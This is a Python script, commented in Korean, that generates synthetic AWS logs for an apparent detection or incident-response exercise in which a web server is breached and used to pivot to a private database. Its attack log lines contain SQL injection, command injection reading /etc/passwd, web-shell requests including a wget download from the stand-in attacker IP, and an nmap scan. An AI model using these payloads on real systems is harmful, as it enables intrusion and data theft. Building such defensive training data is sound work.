"""퍼블릭 서브넷 웹서버 침해 → 프라이빗 서브넷으로 내부 확산 시나리오.
usage: gen_pivot.py OUTDIR [N_SUBNETS] [--with-ct]
web  i-web (10.0.1.10, 공인 IP 3.35.10.10, 퍼블릭 서브넷 subnet-pub, NACL acl-pub)
db   i-db  (10.0.2.20, 프라이빗 서브넷 subnet-priv, NACL acl-priv)
10:00 공격자 198.51.100.7 → 웹 SQLi·명령 삽입·웹셸
10:20 웹서버(10.0.1.10) → 10.0.2.0/24 포트 스캔(VPC Flow)
10:25 웹서버 → DB SSH 무차별 대입 후 성공(DB의 auth.log)
--with-ct: 10:30 웹서버 역할 자격증명으로 외부(198.51.100.7)에서 S3 목록·대량 읽기(CloudTrail)
"""
import json, random, sys, os
from datetime import datetime, timezone, timedelta

random.seed(3)
out = sys.argv[1]
N = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else 50
os.makedirs(out, exist_ok=True)
T0 = datetime(2026, 11, 1, 10, 0, tzinfo=timezone.utc)
ATT, WEB, WEBPUB, DB = "198.51.100.7", "10.0.1.10", "3.35.10.10", "10.0.2.20"

inst = [{"instance_id": "i-web", "private_ip": WEB, "public_ip": WEBPUB, "subnet_id": "subnet-pub",
         "security_groups": ["sg-web"], "name": "web1", "private_dns": "ip-10-0-1-10.ec2.internal", "iam_role": "web-role"},
        {"instance_id": "i-db", "private_ip": DB, "public_ip": None, "subnet_id": "subnet-priv",
         "security_groups": ["sg-db"], "name": "db1", "private_dns": "ip-10-0-2-20.ec2.internal"}]
sgs = [{"group_id": "sg-web", "name": "web", "ingress": [{"protocol": "tcp", "from_port": 80, "to_port": 80, "cidr": "0.0.0.0/0"}]},
       {"group_id": "sg-db", "name": "db", "ingress": [{"protocol": "tcp", "from_port": 22, "to_port": 22, "cidr": "10.0.0.0/16"},
                                                       {"protocol": "tcp", "from_port": 5432, "to_port": 5432, "cidr": "10.0.0.0/16"}]}]
nacls = [{"nacl_id": "acl-pub", "subnet_ids": ["subnet-pub"], "entries": []},
         {"nacl_id": "acl-priv", "subnet_ids": ["subnet-priv"], "entries": []}]
for n in range(N):  # 그 밖의 서브넷과 서버(배경)
    s = 10 + n
    inst.append({"instance_id": f"i-bg{n}", "private_ip": f"10.0.{s}.10", "public_ip": None,
                 "subnet_id": f"subnet-{n}", "security_groups": [f"sg-{n}"]})
    sgs.append({"group_id": f"sg-{n}", "ingress": []})
    nacls.append({"nacl_id": f"acl-{n}", "subnet_ids": [f"subnet-{n}"], "entries": []})
json.dump({"trusted_ips": ["203.0.113.10/32"], "instances": inst, "security_groups": sgs,
           "network_acls": nacls}, open(f"{out}/environment.json", "w"))

def clf(t): return t.strftime("%d/%b/%Y:%H:%M:%S +0000")
web = []
for i in range(300):  # 정상 사용자
    t = T0 + timedelta(seconds=random.randrange(3600))
    web.append((t, f'52.1.{i % 200}.{i % 250 + 1} - - [{clf(t)}] "GET /product.php?id={i} HTTP/1.1" 200 812 "-" "Mozilla/5.0 ({i % 30})"'))
atk = ['GET /product.php?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20 HTTP/1.1',
       'GET /product.php?id=1%20AND%201=1 HTTP/1.1', 'GET /product.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1',
       'GET /ping.php?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1', 'GET /ping.php?host=127.0.0.1|id HTTP/1.1',
       'POST /upload.php HTTP/1.1', 'GET /uploads/shell.php?cmd=id HTTP/1.1',
       'GET /uploads/shell.php?cmd=wget%20http://198.51.100.7/x HTTP/1.1', 'GET /uploads/shell.php?cmd=nmap%2010.0.2.0/24 HTTP/1.1']
for j, r in enumerate(atk):
    t = T0 + timedelta(minutes=5, seconds=20 * j)
    web.append((t, f'{ATT} - - [{clf(t)}] "{r}" 200 {512 + j} "-" "python-requests/2.31"'))
web.sort()
open(f"{out}/nginx_access.log", "w").write("\n".join(l for _, l in web) + "\n")

fl = ["version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes start end action log-status"]
def f(src, dst, sp, dp, t, act="ACCEPT"):
    e = int(t.timestamp()); fl.append(f"2 123456789012 eni-x {src} {dst} {sp} {dp} 6 3 180 {e} {e+60} {act} OK")
for k in range(3000):  # 사내 정상 통신
    a, b = random.sample(inst, 2)
    f(a["private_ip"], b["private_ip"], random.randint(32768, 60999), random.choice((443, 5432, 8080)), T0 + timedelta(seconds=random.randrange(3600)))
for j in range(9):
    t = T0 + timedelta(minutes=5, seconds=20 * j)
    f(ATT, WEB, 40000 + j, 80, t)
t = T0 + timedelta(minutes=20)
for h in range(1, 40):  # 내부 스캔
    for q, p in enumerate((22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017, 3389, 445)):
        f(WEB, f"10.0.2.{h}", 45000 + q, p, t + timedelta(seconds=h), "ACCEPT" if (h == 20 and p in (22, 5432)) else "REJECT")
open(f"{out}/vpcflow.log", "w").write("\n".join(fl) + "\n")

auth = []
t = T0 + timedelta(minutes=25)
for j in range(25):
    auth.append(f"{(t + timedelta(seconds=2*j)).strftime('%b %d %H:%M:%S')} ip-10-0-2-20 sshd[{1000+j}]: Failed password for root from {WEB} port {50000+j} ssh2")
auth.append(f"{(t + timedelta(seconds=60)).strftime('%b %d %H:%M:%S')} ip-10-0-2-20 sshd[2000]: Accepted password for ubuntu from {WEB} port 51000 ssh2")
open(f"{out}/auth.log", "w").write("\n".join(auth) + "\n")

if "--with-ct" in sys.argv:
    recs = []
    for j, a in enumerate(["ListBuckets"] * 1 + ["GetObject"] * 30):
        tt = T0 + timedelta(minutes=30, seconds=j)
        recs.append({"eventTime": tt.strftime("%Y-%m-%dT%H:%M:%SZ"), "eventSource": "s3.amazonaws.com", "eventName": a,
                     "sourceIPAddress": ATT, "awsRegion": "ap-northeast-2",
                     "userIdentity": {"type": "AssumedRole", "arn": "arn:aws:sts::123456789012:assumed-role/web-role/i-web",
                                      "accessKeyId": "ASIAEXAMPLEWEB", "principalId": "AROA:i-web"},
                     "requestParameters": {"bucketName": "prod-data", "key": f"cust/{j}.csv"}})
    json.dump({"Records": recs}, open(f"{out}/cloudtrail.json", "w"))
